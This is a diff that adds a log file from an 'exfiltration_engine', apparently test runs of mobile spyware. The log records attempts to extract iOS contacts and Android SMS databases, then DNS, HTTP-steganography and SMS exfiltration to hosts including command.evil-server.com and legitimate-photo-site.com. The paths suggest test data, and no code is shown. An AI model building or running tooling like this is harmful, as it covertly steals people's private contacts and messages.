@@ -1,0 +1,37 @@
+2025-08-05 01:00:09,075 - exfiltration_engine - ERROR - Error extracting iOS contacts: no such table: ABPerson
+2025-08-05 01:00:09,076 - exfiltration_engine - WARNING - Database not found: /tmp/test_messages.db, using sample data
+2025-08-05 01:00:10,086 - exfiltration_engine - INFO - DNS exfiltration completed: 22 bytes to test.example.com
+2025-08-05 01:00:12,087 - exfiltration_engine - INFO - HTTP steganography exfiltration completed: 22 bytes to https://httpbin.org/post
+2025-08-05 01:00:20,246 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
+2025-08-05 01:00:20,246 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
+2025-08-05 01:02:55,230 - exfiltration_engine - ERROR - Error extracting iOS contacts: unable to open database file
+2025-08-05 01:02:55,230 - exfiltration_engine - WARNING - Database not found: /fake/path/mmssms.db, using sample data
+2025-08-05 01:02:55,233 - exfiltration_engine - ERROR - Error extracting iOS contacts: no such table: ABPerson
+2025-08-05 01:02:55,233 - exfiltration_engine - ERROR - Error extracting iOS contacts: no such table: ABPerson
+2025-08-05 01:02:55,233 - exfiltration_engine - WARNING - Database not found: /tmp/test_messages.db, using sample data
+2025-08-05 01:02:55,233 - exfiltration_engine - WARNING - Database not found: /tmp/test_messages.db, using sample data
+2025-08-05 01:02:56,249 - exfiltration_engine - INFO - DNS exfiltration completed: 22 bytes to test.example.com
+2025-08-05 01:02:56,249 - exfiltration_engine - INFO - DNS exfiltration completed: 22 bytes to test.example.com
+2025-08-05 01:02:58,251 - exfiltration_engine - INFO - HTTP steganography exfiltration completed: 22 bytes to https://httpbin.org/post
+2025-08-05 01:02:58,251 - exfiltration_engine - INFO - HTTP steganography exfiltration completed: 22 bytes to https://httpbin.org/post
+2025-08-05 01:03:06,687 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
+2025-08-05 01:03:06,687 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
+2025-08-05 01:03:06,687 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
+2025-08-05 01:06:43,539 - exfiltration_engine - ERROR - Error extracting iOS contacts: unable to open database file
+2025-08-05 01:06:43,539 - exfiltration_engine - WARNING - Database not found: /fake/path/mmssms.db, using sample data
+2025-08-05 01:06:43,541 - exfiltration_engine - ERROR - Error extracting iOS contacts: no such table: ABPerson
+2025-08-05 01:06:43,541 - exfiltration_engine - ERROR - Error extracting iOS contacts: no such table: ABPerson
+2025-08-05 01:06:43,541 - exfiltration_engine - WARNING - Database not found: /tmp/test_messages.db, using sample data
+2025-08-05 01:06:43,541 - exfiltration_engine - WARNING - Database not found: /tmp/test_messages.db, using sample data
+2025-08-05 01:06:44,553 - exfiltration_engine - INFO - DNS exfiltration completed: 22 bytes to test.example.com
+2025-08-05 01:06:44,553 - exfiltration_engine - INFO - DNS exfiltration completed: 22 bytes to test.example.com
+2025-08-05 01:06:46,556 - exfiltration_engine - INFO - HTTP steganography exfiltration completed: 22 bytes to https://httpbin.org/post
+2025-08-05 01:06:46,556 - exfiltration_engine - INFO - HTTP steganography exfiltration completed: 22 bytes to https://httpbin.org/post
+2025-08-05 01:06:54,772 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
+2025-08-05 01:06:54,772 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
+2025-08-05 01:06:54,772 - exfiltration_engine - INFO - DNS exfiltration completed: 24 bytes to test.example.com
+2025-08-05 01:08:39,276 - exfiltration_engine - ERROR - Error extracting iOS contacts: unable to open database file
+2025-08-05 01:08:39,287 - exfiltration_engine - WARNING - Database not found: /fake/path, using sample data
+2025-08-05 01:08:55,625 - exfiltration_engine - INFO - DNS exfiltration completed: 1000 bytes to command.evil-server.com
+2025-08-05 01:08:58,634 - exfiltration_engine - INFO - HTTP steganography exfiltration completed: 96 bytes to https://legitimate-photo-site.com/upload
+2025-08-05 01:08:58,850 - exfiltration_engine - INFO - SMS covert exfiltration completed: 0 bytes to +1234567890
